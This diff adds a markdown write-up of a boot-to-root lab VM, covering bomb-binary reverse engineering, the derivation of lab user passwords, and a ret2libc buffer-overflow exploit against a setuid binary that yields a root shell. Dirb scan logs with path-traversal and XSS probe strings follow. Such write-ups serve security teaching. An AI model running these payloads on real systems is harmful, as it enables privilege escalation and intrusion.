+This leaves us with four valid solutions: `opekma`, `opukma`, `opekmq` and `opukmq`. 
+
+</details>
+
+<details>
+<summary> bomb phase 6
+</summary>
+
+`Ghidra` shows us the decompiled code. 
+
+```c
+/* WARNING: Type propagation algorithm not settling */
+
+void phase_6(undefined4 param_1)
+
+{
+  int *piVar1;
+  int iVar2;
+  int *piVar3;
+  int iVar4;
+  undefined1 *local_38;
+  int *local_34 [6];
+  int local_1c [6];
+  
+  local_38 = node1;
+  read_six_numbers(param_1,local_1c);
+  iVar4 = 0;
+  do {
+    iVar2 = iVar4;
+    if (5 < local_1c[iVar4] - 1U) {
+      explode_bomb();
+    }
+    while (iVar2 = iVar2 + 1, iVar2 < 6) {
+      if (local_1c[iVar4] == local_1c[iVar2]) {
+        explode_bomb();
+      }
+    }
+    iVar4 = iVar4 + 1;
+  } while (iVar4 < 6);
+  iVar4 = 0;
+  do {
+    iVar2 = 1;
+    piVar3 = (int *)local_38;
+    if (1 < local_1c[iVar4]) {
+      do {
+        piVar3 = (int *)piVar3[2];
+        iVar2 = iVar2 + 1;
+      } while (iVar2 < local_1c[iVar4]);
+    }
+    local_34[iVar4] = piVar3;
+    iVar4 = iVar4 + 1;
+  } while (iVar4 < 6);
+  iVar4 = 1;
+  piVar3 = local_34[0];
+  do {
+    piVar1 = local_34[iVar4];
+    piVar3[2] = (int)piVar1;
+    iVar4 = iVar4 + 1;
+    piVar3 = piVar1;
+  } while (iVar4 < 6);
+  piVar1[2] = 0;
+  iVar4 = 0;
+  do {
+    if (*local_34[0] < *(int *)local_34[0][2]) {
+      explode_bomb();
+    }
+    local_34[0] = (int *)local_34[0][2];
+    iVar4 = iVar4 + 1;
+  } while (iVar4 < 5);
+  return;
+}
+```
+
+This phase takes six numbers as input, converts them to integers and checks if they are smaller than seven. It then initialises a linked list with the values of variables called nodes and checks if the value of the node, corresponding to the index given by the input, is bigger than the value of the next. This means we need to sort the nodes by size. 
+
+Let's figure out what value they have with `gdb`.
+
+```console
+laurie@BornToSecHackMe:~$ gdb bomb
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/laurie/bomb...done.
+(gdb) break phase_6
+Breakpoint 1 at 0x8048da1
+(gdb) run
+Starting program: /home/laurie/bomb
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+Public speaking is very easy.
+Phase 1 defused. How about the next one?
+1 2 6 24 120 720
+That's number 2.  Keep going!
+1 b 214
+Halfway there!
+9
+So you got that one.  Try this one.
+opekma
+Good work!  On to the next...
+1 2 3 4 5 6
+
+Breakpoint 1, 0x08048da1 in phase_6 ()
+(gdb) print node1
+$1 = 253
+(gdb) print node2
+$2 = 725
+(gdb) print node3
+$3 = 301
+(gdb) print node4
+$4 = 997
+(gdb) print node5
+$5 = 212
+(gdb) print node6
+$6 = 432
+```
+
+With this we now only have to give the index of the nodes in descending order to pass the phase. 
+
+`4 2 6 3 1 5`
+
+</details>
+
+<details>
+<summary> bomb Secret Phase
+</summary>
+
+While going through the bomb with Ghidra we discovered a secret phase that is called from the phase_defused function:
+
+```c
+void phase_defused(void)
+
+{
+  int iVar1;
+  undefined local_58 [4];
+  undefined local_54 [80];
+  
+  if (num_input_strings == 6) {
+    iVar1 = sscanf(input_strings + 0xf0,"%d %s",local_58,local_54);
+    if (iVar1 == 2) {
+      iVar1 = strings_not_equal(local_54,"austinpowers");
+      if (iVar1 == 0) {
+        printf("Curses, you\'ve found the secret phase!\n");
+        printf("But finding it and solving it are quite different...\n");
+        secret_phase();
+      }
+    }
+    printf("Congratulations! You\'ve defused the bomb!\n");
+  }
+  return;
+}
+```
+
+It checks if two arguments have been entered and if the second equals the string *austinpowers*. Also the first one is defined as a number.
+So far only one the password from phase_4 would match that form if we add the necessary string to it.
+
+`9 austinpowers`
+
+This indeed directly brings us to the function secret_phase that calls the function _fun7_:
+
+```c
+void secret_phase(void)
+
+{
+  undefined4 uVar1;
+  int iVar2;
+  
+  uVar1 = read_line();
+  iVar2 = __strtol_internal(uVar1,0,10,0);
+  if (1000 < iVar2 - 1U) {
+    explode_bomb();
+  }
+  iVar2 = fun7(n1,iVar2);
+  if (iVar2 != 7) {
+    explode_bomb();
+  }
+  printf("Wow! You\'ve defused the secret stage!\n");
+  phase_defused();
+  return;
+}
+
+```c
+int fun7(int *param_1,int param_2)
+
+{
+  int iVar1;
+  
+  if (param_1 == (int *)0x0) {
+    iVar1 = -1;
+  }
+  else if (param_2 < *param_1) {
+    iVar1 = fun7(param_1[1],param_2);
+    iVar1 = iVar1 * 2;
+  }
+  else if (param_2 == *param_1) {
+    iVar1 = 0;
+  }
+  else {
+    iVar1 = fun7(param_1[2],param_2);
+    iVar1 = iVar1 * 2 + 1;
+  }
+  return iVar1;
+}
+```
+
+As in phase 4 we have to deal with recursion here and similar to phase 6 a linked list is used.
+The input is one number that is not allowed to be bigger than 1001. The recursion termination criteria is reached when the input value equals the value of the node that is analyzed.
+Just trying out the node values leads to the value `1001 defusing the secret_phase.
+
+</details>
+
+<details>
+<summary> ./bomb [file]
+</summary>
+
+With all the phases cleared we can put all the passwords into a single file and run `bomb` with that file as a parameter.
+
+```console
+Public speaking is very easy.
+1 2 6 24 120 720
+1 b 214
+9 austinpowers
+opekma
+4 2 6 3 1 5
+1001
+```
+</details>
+
+Putting all the passwords together (without secret ones) and considering the fact, that phase 3 and phase 5 have multiple solution, we have 12 possible passwords in total for user _thor_.
+
+The correct would be `Publicspeakingisveryeasy.126241207201b2149opekmq426315`, but due to a typo in the iso it is `Publicspeakingisveryeasy.126241207201b2149opekmq426135` where the 3 and 1 from the last phase needs to be swapped.
+
+## User _thor_
+
+### turtle
+
+<details>
+<summary> turtle discovery
+</summary>
+
+When logging into user _thor_ via ssh with `Publicspeakingisveryeasy.126241207201b2149opekmq426135`, we can see a `README` and an ASCII file `turtle`.
+
+```console
+thor@BornToSecHackMe:~$ ls
+README  turtle
+thor@BornToSecHackMe:~$ cat README
+Finish this challenge and use the result as password for 'zaz' user.
+thor@BornToSecHackMe:~$ file turtle
+turtle: ASCII text
+```
+With `scp -P 22 thor@192.168.178.62:/home/thor/turtle .` we can download `turtle` to our machine.
+
+</details>
+
+<details>
+<summary> turtle analysis
+</summary>
+
+It contains about 1500 of french instructions that can be reduces these 4 actions (where `x` is a number):
+
+```console
+[...]
+Tourne gauche de x degrees
+Avance x spaces
+Tourne droite de x degrees
+Recule x spaces
+[...]
+```
+
+and in the last line also the hint `Can you digest the message? :)` that may indicate that we have to encrypt what we find.
+
+
+Thanks to tools like deepl we can translate that instantly:
+
+```console
+[...]
+Turn left x degrees
+Forward x spaces
+Turn right x degrees
+Go back x spaces
+[...]
+```
+</details>
+
+<details>
+<summary> turtle transformation
+</summary>
+
+Further research on "turtle" combined with these instructions immediatly give the result of a python drawing program.
+Having a look at the syntax of it and replacing the french instructions with the respective python code leads to the following:
+
+```python
+import tkinter as TK
+import turtle
+s = turtle.getscreen()
+t = turtle.Turtle()
+[...]
+t.left(x)
+t.forward(x)
+t.right(x)
+t.backward(x)
+[...]
+```
+
+</details>
+
+<details>
+<summary> turtle execution
+</summary>
+Running it gives us the following:
+
+<img width="1279" alt="Screen Shot 2023-01-24 at 8 18 57 PM" src="https://user-images.githubusercontent.com/70098821/214387811-69304249-bbf6-4275-92df-4953f2aeb3de.png">
+
+</details>
+
+The letters combine to the word *SLASH*. As previously mentioned there was a hint about an encryption. Trying out a few standard ones (SHS256, SHA512 etc) leads to an *MD5* encryption and therefore to the password `646da671ca01bb5d84dbb5fb2238dc8e` for user zaz.
+
+## User zaz
+
+### ./exploit_me
+
+<details>
+<summary> exploit_me discovery
+</summary>
+
+```console
+zaz@BornToSecHackMe:~$ ls -l
+total 5
+-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
+drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail   
+``` 
+
+</details>
+
+<details>
+<summary> exploit_me analysis
+</summary>
+
+Opening it with Ghidra gives the following decompiled code for the main:
+
+```c
+bool main(int param_1,int param_2)
+
+{
+  char local_90 [140];
+  
+  if (1 < param_1) {
+    strcpy(local_90,*(char **)(param_2 + 4));
+    puts(local_90);
+  }
+  return param_1 < 2;
+}
+```
+
+So if we provide an argument when executing `exploit_me` it will be copied into another string with `strcpy` and this one then printed to the *stdout* with `puts`.
+
+The vulnerability here comes from the use of strcpy with a destination size of 140. We can cause a buffer overflow and then inject the call of a shell with user root.
+
+</details>
+
+<details>
+<summary> exploit_me exploit
+</summary>
+
+In order to do so, we can use a return-to-libc exploit. [[xxx]](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc) With this we only need to find the address of `exploit_me`'s `exit()`-call and overwrite it with a `system()`-call that takes `"/bin/sh"` as an argument. First we need those memory addresses.
+
+We can find out more with GDB. 
+
+```console
+zaz@BornToSecHackMe:~$ gdb exploit_me
+[...]
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080483f4 <+0>:	push   %ebp
+   0x080483f5 <+1>:	mov    %esp,%ebp
+   0x080483f7 <+3>:	and    $0xfffffff0,%esp
+   0x080483fa <+6>:	sub    $0x90,%esp
+   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
+   0x08048404 <+16>:	jg     0x804840d <main+25>
+   0x08048406 <+18>:	mov    $0x1,%eax
+   0x0804840b <+23>:	jmp    0x8048436 <main+66>
+   0x0804840d <+25>:	mov    0xc(%ebp),%eax
+   0x08048410 <+28>:	add    $0x4,%eax
+   0x08048413 <+31>:	mov    (%eax),%eax
+   0x08048415 <+33>:	mov    %eax,0x4(%esp)
+   0x08048419 <+37>:	lea    0x10(%esp),%eax
+   0x0804841d <+41>:	mov    %eax,(%esp)
+   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>:	lea    0x10(%esp),%eax
+   0x08048429 <+53>:	mov    %eax,(%esp)
+   0x0804842c <+56>:	call   0x8048310 <puts@plt>
+   0x08048431 <+61>:	mov    $0x0,%eax
+   0x08048436 <+66>:	leave
+   0x08048437 <+67>:	ret
+End of assembler dump.
+(gdb) break strcpy
+Breakpoint 1 at 0x8048300
+(gdb) run exploiting_you
+Starting program: /home/zaz/exploit_me exploiting_you
+
+Breakpoint 1, 0xb7eb0200 in ?? () from /lib/i386-linux-gnu/libc.so.6
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) print exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+(gdb) find &system,+987654321,"/bin/sh"
+0xb7f8cc58
+```
+
+After disassembling the `main()` we can set a breakpoint at `strcpy()` and `print` the addresses we need. To get our `"/bin/sh"` string, we can use a `find` within GDB on libc, which contains that string. 
+
+This leaves us with the following addresses, which we need to convert:
+
+```
+system     0xb7e6b060 -> \x60\xb0\xe6\xb7
+exit       0xb7e5ebe0 -> \xe0\xeb\xe5\xb7
+"/bin/sh"  0xb7f8cc58 -> \x58\xcc\xf8\xb7
+```
+
+Now we can build a simple payload using python.
+
+```console
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print("A"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X��
+# whoami
+root
+```
+
+</details>
+
+# Appendix
+
+## Dirb
+
+<details>
+<summary> http
+</summary>
+
+```console
+madasanya:vulns>> dirb http://192.168.56.101/
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Jan  3 18:30:47 2023
+URL_BASE: http://192.168.56.101/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://192.168.56.101/ ----
++ http://192.168.56.101/cgi-bin/ (CODE:403|SIZE:290)
+==> DIRECTORY: http://192.168.56.101/fonts/
++ http://192.168.56.101/forum (CODE:403|SIZE:287)
++ http://192.168.56.101/index.html (CODE:200|SIZE:1025)
++ http://192.168.56.101/server-status (CODE:403|SIZE:295)
+
+---- Entering directory: http://192.168.56.101/fonts/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+-----------------
+END_TIME: Tue Jan  3 18:31:06 2023
+DOWNLOADED: 4612 - FOUND: 4
+```
+</details>
+
+<details>
+<summary> https
+</summary>
+
+```console
+madasanya:vulns>>dirb https://192.168.56.101/
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Jan  3 18:33:24 2023
+URL_BASE: https://192.168.56.101/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: https://192.168.56.101/ ----
++ https://192.168.56.101/cgi-bin/ (CODE:403|SIZE:291)
+==> DIRECTORY: https://192.168.56.101/forum/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/
++ https://192.168.56.101/server-status (CODE:403|SIZE:296)
+==> DIRECTORY: https://192.168.56.101/webmail/
+
+---- Entering directory: https://192.168.56.101/forum/ ----
++ https://192.168.56.101/forum/backup (CODE:403|SIZE:295)
++ https://192.168.56.101/forum/config (CODE:403|SIZE:295)
+==> DIRECTORY: https://192.168.56.101/forum/images/
+==> DIRECTORY: https://192.168.56.101/forum/includes/
++ https://192.168.56.101/forum/index (CODE:200|SIZE:4935)
++ https://192.168.56.101/forum/index.php (CODE:200|SIZE:4935)
+==> DIRECTORY: https://192.168.56.101/forum/js/
+==> DIRECTORY: https://192.168.56.101/forum/lang/
+==> DIRECTORY: https://192.168.56.101/forum/modules/
+==> DIRECTORY: https://192.168.56.101/forum/templates_c/
+==> DIRECTORY: https://192.168.56.101/forum/themes/
+==> DIRECTORY: https://192.168.56.101/forum/update/
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/ ----
++ https://192.168.56.101/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)
++ https://192.168.56.101/phpmyadmin/index.php (CODE:200|SIZE:7540)
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/js/
++ https://192.168.56.101/phpmyadmin/libraries (CODE:403|SIZE:303)
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/
++ https://192.168.56.101/phpmyadmin/phpinfo.php (CODE:200|SIZE:7540)
++ https://192.168.56.101/phpmyadmin/setup (CODE:401|SIZE:482)
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/themes/
+
+---- Entering directory: https://192.168.56.101/webmail/ ----
++ https://192.168.56.101/webmail/class (CODE:403|SIZE:296)
+==> DIRECTORY: https://192.168.56.101/webmail/config/
++ https://192.168.56.101/webmail/functions (CODE:403|SIZE:300)
++ https://192.168.56.101/webmail/help (CODE:403|SIZE:295)
+==> DIRECTORY: https://192.168.56.101/webmail/images/
++ https://192.168.56.101/webmail/include (CODE:403|SIZE:298)
++ https://192.168.56.101/webmail/index.php (CODE:302|SIZE:0)
++ https://192.168.56.101/webmail/locale (CODE:403|SIZE:297)
+==> DIRECTORY: https://192.168.56.101/webmail/plugins/
+==> DIRECTORY: https://192.168.56.101/webmail/src/
+==> DIRECTORY: https://192.168.56.101/webmail/themes/
+
+---- Entering directory: https://192.168.56.101/forum/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: https://192.168.56.101/forum/includes/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: https://192.168.56.101/forum/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: https://192.168.56.101/forum/lang/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: https://192.168.56.101/forum/modules/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: https://192.168.56.101/forum/templates_c/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: https://192.168.56.101/forum/themes/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: https://192.168.56.101/forum/update/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/js/ ----
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/js/jquery/
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/ ----
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/ar/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/be/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/bg/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/ca/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/cs/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/da/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/de/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/el/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/es/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/et/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/fi/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/fr/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/gl/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/hi/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/hr/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/hu/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/id/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/it/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/ja/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/lt/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/nl/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/pl/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/pt_BR/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/ro/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/ru/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/si/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/sk/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/sl/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/sr/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/sv/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/tr/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/uk/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/zh_CN/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/locale/zh_TW/
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/themes/ ----
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/themes/original/
+
+---- Entering directory: https://192.168.56.101/webmail/config/ ----
++ https://192.168.56.101/webmail/config/index.php (CODE:302|SIZE:0)
+
+---- Entering directory: https://192.168.56.101/webmail/images/ ----
++ https://192.168.56.101/webmail/images/index.php (CODE:302|SIZE:0)
+
+---- Entering directory: https://192.168.56.101/webmail/plugins/ ----
+==> DIRECTORY: https://192.168.56.101/webmail/plugins/administrator/
+==> DIRECTORY: https://192.168.56.101/webmail/plugins/calendar/
+==> DIRECTORY: https://192.168.56.101/webmail/plugins/demo/
+==> DIRECTORY: https://192.168.56.101/webmail/plugins/fortune/
++ https://192.168.56.101/webmail/plugins/index.php (CODE:302|SIZE:0)
+==> DIRECTORY: https://192.168.56.101/webmail/plugins/info/
+==> DIRECTORY: https://192.168.56.101/webmail/plugins/test/
+==> DIRECTORY: https://192.168.56.101/webmail/plugins/translate/
+
+---- Entering directory: https://192.168.56.101/webmail/src/ ----
++ https://192.168.56.101/webmail/src/index.php (CODE:302|SIZE:0)
+
+---- Entering directory: https://192.168.56.101/webmail/themes/ ----
+==> DIRECTORY: https://192.168.56.101/webmail/themes/css/
++ https://192.168.56.101/webmail/themes/index.php (CODE:302|SIZE:0)
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/js/jquery/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/ar/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/be/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/bg/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/ca/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/cs/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/da/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/de/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/el/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/es/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/et/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/fi/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/fr/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/gl/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/hi/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/hr/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/hu/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/id/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/it/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/ja/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/lt/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/nl/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/pl/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/pt_BR/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/ro/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/ru/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/si/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/sk/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/sl/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/sr/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/sv/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/tr/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/uk/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/zh_CN/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/locale/zh_TW/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/themes/original/ ----
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/themes/original/css/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/themes/original/img/
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/themes/original/jquery/
+
+---- Entering directory: https://192.168.56.101/webmail/plugins/administrator/ ----
++ https://192.168.56.101/webmail/plugins/administrator/index.php (CODE:302|SIZE:0)
+
+---- Entering directory: https://192.168.56.101/webmail/plugins/calendar/ ----
++ https://192.168.56.101/webmail/plugins/calendar/index.php (CODE:302|SIZE:0)
++ https://192.168.56.101/webmail/plugins/calendar/README (CODE:200|SIZE:887)
+
+---- Entering directory: https://192.168.56.101/webmail/plugins/demo/ ----
++ https://192.168.56.101/webmail/plugins/demo/index.php (CODE:302|SIZE:0)
++ https://192.168.56.101/webmail/plugins/demo/README (CODE:200|SIZE:837)
+
+---- Entering directory: https://192.168.56.101/webmail/plugins/fortune/ ----
++ https://192.168.56.101/webmail/plugins/fortune/index.php (CODE:302|SIZE:0)
++ https://192.168.56.101/webmail/plugins/fortune/README (CODE:200|SIZE:485)
+
+---- Entering directory: https://192.168.56.101/webmail/plugins/info/ ----
++ https://192.168.56.101/webmail/plugins/info/index.php (CODE:302|SIZE:0)
++ https://192.168.56.101/webmail/plugins/info/README (CODE:200|SIZE:1632)
+
+---- Entering directory: https://192.168.56.101/webmail/plugins/test/ ----
++ https://192.168.56.101/webmail/plugins/test/index.php (CODE:302|SIZE:0)
++ https://192.168.56.101/webmail/plugins/test/README (CODE:200|SIZE:505)
+
+---- Entering directory: https://192.168.56.101/webmail/plugins/translate/ ----
++ https://192.168.56.101/webmail/plugins/translate/index.php (CODE:302|SIZE:0)
++ https://192.168.56.101/webmail/plugins/translate/README (CODE:200|SIZE:1730)
+
+---- Entering directory: https://192.168.56.101/webmail/themes/css/ ----
++ https://192.168.56.101/webmail/themes/css/index.php (CODE:302|SIZE:0)
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/themes/original/css/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/themes/original/img/ ----
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/themes/original/jquery/ ----
+==> DIRECTORY: https://192.168.56.101/phpmyadmin/themes/original/jquery/images/
+
+---- Entering directory: https://192.168.56.101/phpmyadmin/themes/original/jquery/images/ ----
+
+-----------------
+END_TIME: Tue Jan  3 18:48:37 2023
+DOWNLOADED: 276720 - FOUND: 36
+```
+</details>
+
+<details>
+<summary>dirb cgi vulns
+</summary>
+
+In addition we can check for specific vulnerabilities (like cgi related) with Dirb [[xxx](https://www.hackers-arise.com/post/2016/12/13/web-app-hacling-part-4-using-dirb-to-find-hidden-directories)
+
+```console
+madasanya:vulns>>dirb http://192.168.56.101 /usr/share/dirb/wordlists/vulns/cgis.txt 
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Jan  3 14:44:39 2023
+URL_BASE: http://192.168.56.101/
+WORDLIST_FILES: /usr/share/dirb/wordlists/vulns/cgis.txt
+
+-----------------
+
+GENERATED WORDS: 3388
+
+---- Scanning URL: http://192.168.56.101/ ----
++ http://192.168.56.101/./ (CODE:200|SIZE:1025)
++ http://192.168.56.101/%NETHOOD%/ (CODE:400|SIZE:306)
++ http://192.168.56.101/?mod=node&nid=some_thing&op=view (CODE:200|SIZE:1025)
++ http://192.168.56.101/?mod=some_thing&op=browse (CODE:200|SIZE:1025)
++ http://192.168.56.101// (CODE:200|SIZE:1025)
++ http://192.168.56.101/?Open (CODE:200|SIZE:1025)
++ http://192.168.56.101/?OpenServer (CODE:200|SIZE:1025)
++ http://192.168.56.101/%2e/ (CODE:200|SIZE:1025)
++ http://192.168.56.101/%a%s%p%d (CODE:400|SIZE:306)
++ http://192.168.56.101/default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20% (CODE:400|SIZE:306)
++ http://192.168.56.101/cgi-bin/ssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd (CODE:400|SIZE:306)
++ http://192.168.56.101/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini (CODE:400|SIZE:306)
++ http://192.168.56.101/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd (CODE:400|SIZE:306)
++ http://192.168.56.101/?mod=<script>alert(document.cookie)</script>&op=browse (CODE:200|SIZE:1025)
++ http://192.168.56.101/?sql_debug=1 (CODE:200|SIZE:1025)
++ http://192.168.56.101/// (CODE:200|SIZE:1025)
++ http://192.168.56.101/doc/ (CODE:403|SIZE:286)
++ http://192.168.56.101/cgi-bin/ (CODE:403|SIZE:290)
++ http://192.168.56.101/server-status (CODE:403|SIZE:295)
++ http://192.168.56.101/?PageServices (CODE:200|SIZE:1025)
++ http://192.168.56.101/?wp-cs-dump (CODE:200|SIZE:1025)
++ http://192.168.56.101/forum/ (CODE:403|SIZE:288)
++ http://192.168.56.101/icons/ (CODE:403|SIZE:288)
++ http://192.168.56.101//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// (CODE:200|SIZE:1025)
++ http://192.168.56.101/?pattern=/etc/*&sort=name (CODE:200|SIZE:1025)
++ http://192.168.56.101/?D=A (CODE:200|SIZE:1025)
++ http://192.168.56.101/?N=D (CODE:200|SIZE:1025)
++ http://192.168.56.101/?S=A (CODE:200|SIZE:1025)
++ http://192.168.56.101/?M=A (CODE:200|SIZE:1025)
